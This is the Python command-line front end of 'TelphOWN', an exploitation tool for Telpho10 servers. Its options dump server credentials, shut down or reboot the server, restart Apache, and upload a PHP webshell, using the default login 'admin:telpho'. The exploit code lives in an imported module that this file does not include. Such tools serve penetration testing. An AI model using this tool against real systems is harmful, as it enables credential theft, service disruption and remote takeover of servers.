#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#-------------------------------------------------------------------------------
# TelphOWN - Telpho10 Ownage Tool
# Copyright (c) 2021 Jan Rude
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see [http://www.gnu.org/licenses/](http://www.gnu.org/licenses/)
#-------------------------------------------------------------------------------

__version__ = '1.0'
__program__ = 'TelphOWN'
__description__ = 'Telpho10 Ownage Tool'
__author__ = 'https://github.com/whoot'

import sys
import argparse
from lib.exploits import Exploits

class TelphOWN:
	def __init__(self):
		pass

	def print_help():
		print(
'''\nUsage: python3 TelphOWN.py [options]

Options:
  -h, --help 		Show this help message and exit

  Target:
   Define the targets IP address

    -t [IP], --target [IP]


  Operations:
   Choose the exloit you want to use

    --dump 	Create a backup, download it and dump credentials
    --shutdown  Shutdown server  
    --reboot 	Reboot server
    --restart 	Restart Apache
    --shell  	Uploads a specified PHP-Webshell
    --creds [username:password] 
    		Weblogin credentials. Only needed for --shell
    		Default: admin:telpho
''')

	def run(self):
		parser = argparse.ArgumentParser(add_help=False)
		nonauth = parser.add_mutually_exclusive_group()
		help = parser.add_mutually_exclusive_group()
		parser.add_argument('-t', '--target', dest='target', type=str)
		nonauth.add_argument('--dump', dest='dump', action='store_true')
		nonauth.add_argument('--shutdown', action='store_true')
		nonauth.add_argument('--reboot', action='store_true')
		nonauth.add_argument('--restart', action='store_true')
		parser.add_argument('--shell', dest='shell', type=str)
		parser.add_argument('--creds', dest='credentials', type=str, default='admin:telpho')
		help.add_argument('-h', '--help', action='store_true')
		args = parser.parse_args()

		if args.help or len(sys.argv) < 2:
			TelphOWN.print_help()
			return True

		try:
			if not ('http' in args.target):
				args.target = 'http://' + args.target
			exploits = Exploits(args.target, args.credentials, args.shell)
			
			if args.dump:
				exploits.dump_credentials()

			elif args.reboot:
				exploits.reboot_server()

			elif args.shutdown:
				exploits.shutdown_server()

			elif args.restart:
				exploits.restart_Apache()

			elif args.shell:
				exploits.upload_webshell()

		except KeyboardInterrupt:
			print('\nReceived keyboard interrupt.\nQuitting...')
			exit(-1)

if __name__ == '__main__':
	print('\n' + 60*'=')
	print('  ______     __      __    ____ _       ___   __'.center(60))
	print(' /_  __/__  / /___  / /_  / __ \ |     / / | / /'.center(60))
	print('  / / / _ \/ / __ \/ __ \/ / / / | /| / /  |/ / '.center(60))
	print(' / / /  __/ / /_/ / / / / /_/ /| |/ |/ / /|  /  '.center(60))
	print('/_/  \___/_/ .___/_/ /_/\____/ |__/|__/_/ |_/   '.center(60))
	print('          /_/                                   '.center(60))
	print(__description__.center(60))
	print(('Version ' + __version__).center(60))
	print((__author__).center(60))
	print(60*'=')
	main = TelphOWN()
	main.run()